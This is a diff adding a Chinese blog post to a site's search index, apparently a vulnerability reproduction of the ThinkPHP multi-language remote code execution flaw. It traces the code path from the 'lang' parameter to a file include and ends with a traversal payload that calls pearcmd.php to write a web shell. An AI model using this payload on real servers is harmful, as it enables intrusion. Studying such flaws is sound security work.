@@ -2190,4 +2190,165 @@
         <tag>-后渗透</tag>
       </tags>
   </entry>
+  <entry>
+    <title>thinkphp多语言RCE</title>
+    <url>/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/</url>
+    <content><![CDATA[<h1 id="thinkphp-多语言RCE"><a href="#thinkphp-多语言RCE" class="headerlink" title="thinkphp 多语言RCE"></a>thinkphp 多语言RCE</h1><p>本次复现 不像传统漏洞复现 以正向流程进行漏洞复现，而是以发现漏洞利用点后，如何调用漏洞利用点进行反向调用漏洞流程 ，让初学者学习如何挖掘漏洞</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think tp 6.0.1</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><strong>清理 Composer 缓存：</strong> 运行以下命令清理 Composer 缓存，以确保使用最新的依赖关系信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer clear-cache</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>删除 <code>vendor</code> 目录和 <code>composer.lock</code> 文件：</strong> 删除 <code>vendor</code> 目录和 <code>composer.lock</code> 文件，然后重新运行 <code>composer install</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf vendor</span><br><span class="line">composer install</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>手动编辑 <code>composer.lock</code> 文件：</strong> 如果上述步骤未能解决问题，你可以尝试手动编辑 <code>composer.lock</code> 文件，将 <code>&quot;topthink/framework&quot;</code> 的版本更改为 <code>&quot;v6.0.1&quot;</code>。请注意，手动编辑 <code>composer.lock</code> 文件可能会引入其他问题，所以请小心操作。</p>
+<p>打开 <code>composer.lock</code> 文件，找到 <code>&quot;topthink/framework&quot;</code> 的部分，将版本更改为 <code>&quot;v6.0.1&quot;</code>，然后保存文件。</p>
+</li>
+<li><p><strong>运行 <code>composer update</code>：</strong> 运行 <code>composer update</code> 命令，以确保 <code>composer.lock</code> 文件中的版本与 <code>composer.json</code> 文件中的版本一致：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p>
+<p>漏洞描述</p>
+<p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p>
+<p>Thinkphp6开启多语言模式</p>
+<p>目录：app&#x2F;middleware.php</p>
+<img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102152057121.png" class="" title="image-20231102152057121">
+
+<p>thinkphp5开启多语言模式</p>
+<p>目录 application&#x2F;config.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;lang_switch_on&#x27;         =&gt; true</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102152245876.png" class="" title="image-20231102152245876">
+
+
+
+<h2 id="多语言模式下的文件包含"><a href="#多语言模式下的文件包含" class="headerlink" title="多语言模式下的文件包含"></a>多语言模式下的文件包含</h2><h4 id="寻找攻击链"><a href="#寻找攻击链" class="headerlink" title="寻找攻击链"></a>寻找攻击链</h4><p>漏洞触发点</p>
+<p>Lang.php下的parse函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">               <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>; <span class="comment">#任意文件包含</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">               <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现在Lang.php下load函数调用了它</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$range</span> = <span class="string">&#x27;&#x27;</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$range</span> = <span class="variable">$range</span> ?: <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$lang</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$_file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_file</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$_file</span>);</span><br><span class="line">                <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lang</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = <span class="variable">$lang</span> + <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>全局搜索load的调用，连续两次Shift键</p>
+<img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102162445261.png" class="" title="image-20231102162445261">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LoadLangPack.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自动侦测当前语言</span></span><br><span class="line">        <span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">defaultLangSet</span>() != <span class="variable">$langset</span>) &#123;</span><br><span class="line">            <span class="comment">// 加载系统语言包</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">LoadLangPack</span>(<span class="variable">$langset</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">saveToCookie</span>(<span class="variable">$this</span>-&gt;app-&gt;cookie);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>全局搜索handle却没发现任何有被调用的痕迹，这个时候如果是正常情况下已经断了。</p>
+<p>但是LoadLangPack 这个类与多语言加载有关 midddleware.php中注释取消 环境会自动进行类加载</p>
+<p>到此一个完整的攻击链完成 接着就是 构造合适的参数达到对文件包含的利用</p>
+<h4 id="构建攻击参数"><a href="#构建攻击参数" class="headerlink" title="构建攻击参数"></a>构建攻击参数</h4><p>开启多语言后 LoadLangPack.php默认加载的化</p>
+<p>首先分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br></pre></td></tr></table></figure>
+
+<p>进入Ctrl+B detect()</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 自动侦测设置获取语言选择</span></span><br><span class="line">       <span class="variable">$langSet</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// url中设置了语言变量</span></span><br><span class="line">           <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// Cookie中设置了语言变量</span></span><br><span class="line">           <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>]));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// 自动侦测浏览器语言</span></span><br><span class="line">           <span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([a-z\d\-]+)/i&#x27;</span>, <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>), <span class="variable">$matches</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$match</span>) &#123;</span><br><span class="line">               <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$matches</span>[<span class="number">1</span>]);</span><br><span class="line">               <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>])) &#123;</span><br><span class="line">                   <span class="variable">$langSet</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>];</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>]) || <span class="title function_ invoke__">in_array</span>(<span class="variable">$langSet</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// 合法的语言</span></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;range = <span class="variable">$langSet</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入第一个if </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;detect_var&#x27;      =&gt; &#x27;lang&#x27;,</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;config[&#x27;detect_var&#x27;]    ==  lang</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们 传递的参数是lang</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>$request-&gt;get是thinkphp app&#x2F;Request中的方法 这里不详细说明 我们可以理解为 把lang传递的数据小写赋值给$langSet</p>
+<p>$this-&gt;config[‘allow_lang_list’]默认是空</p>
+<p>最后返回 lang传递的数据</p>
+<p>进入load</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">            ]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p> $this-&gt;app-&gt;getThinkPath()默认的php安装路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx\tp\vendor\topthink\framework\src\</span><br></pre></td></tr></table></figure>
+
+<p>默认</p>
+<p>DIRECTORY_SEPARATOR&#x3D;’\‘</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx\tp\vendor\topthink\framework\src\lang\我们输入的数据.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$_file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_file</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$_file</span>);</span><br><span class="line">                <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>让$_file存在 利用..&#x2F;..&#x2F;..&#x2F;目录穿越 绕过if </p>
+<p>进入parse()</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>$type就是php 它给加的默认后缀</p>
+<h4 id="pear-写入文件"><a href="#pear-写入文件" class="headerlink" title="pear 写入文件"></a>pear 写入文件</h4><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
+<p>利用条件</p>
+<p>1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd.php的文件路径</p>
+<p>2）web环境下在php.ini中register_argc_argv设置为On</p>
+<p>3）存在文件包含，可以包含php文件并且没有open_basedir的限制</p>
+<p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p>
+<p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，无论后面的内容是否有等号。</p>
+<p>docker 下的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>thinkphp</tag>
+      </tags>
+  </entry>
 </search>
